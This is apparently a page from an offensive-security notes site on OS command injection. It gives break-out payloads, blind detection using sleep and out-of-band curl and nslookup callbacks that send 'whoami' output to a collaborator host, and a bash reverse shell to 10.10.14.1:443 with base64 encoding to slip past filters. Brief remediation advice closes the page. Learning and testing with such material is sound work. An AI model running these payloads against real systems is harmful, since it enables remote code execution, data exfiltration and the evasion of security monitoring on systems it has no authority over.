---
tags:
  - Web
---

# :material-console: OS Command Injection

<span class="pill pill-hard">→ RCE</span> <span class="pill pill-info">web</span>

When user input reaches a shell call (`system()`, `exec()`, backticks), you can append your own commands. It's the shortest path from web bug to shell.

!!! abstract "TL;DR"
    Find input used in a filename, ping, PDF/convert, or archive feature. Break out with a shell metacharacter, then confirm with a delay or an out-of-band callback.

## :material-magnify: Break-out characters

```text
; ls          # command separator
| id          # pipe into your command
& whoami      # background / chain
`id`  $(id)   # command substitution
%0a id        # newline (URL-encoded)
```

## :material-clock-outline: Blind detection

No output on the page — prove execution another way:

=== "Time-based"

    ```bash
    ping -c 5 127.0.0.1      # ~5s delay = injection
    sleep 5
    ```

=== "Out-of-band (OAST)"

    ```bash
    curl http://COLLAB.oastify.com/$(whoami)
    nslookup `whoami`.COLLAB.oastify.com
    ```

    Data exfiltrates through DNS/HTTP even when the app shows nothing.

## :material-shield-sword: Get a shell

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.1/443 0>&1'
# encode to dodge filters:
echo -n 'bash -i >& /dev/tcp/10.10.14.1/443 0>&1' | base64
# ...;echo <b64>|base64 -d|bash
```

!!! opsec "Loud and logged"
    Spawned shells and outbound connections light up EDR. Prefer a single OAST confirmation before going interactive.

## :material-shield-check: Remediation

- Avoid the shell entirely — use language APIs (`subprocess` with an arg **list**, no `shell=True`).
- If unavoidable, allowlist input and use `shlex.quote`; never blocklist characters.

## :material-link-variant: Related

- Filtered? Same bypass tricks apply to [SSTI](ssti.md) and [Deserialization](deserialization.md).
- Got a shell → [Linux Privesc](../privesc/linux.md) / [Windows Privesc](../privesc/windows.md).
- Reference: [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings).
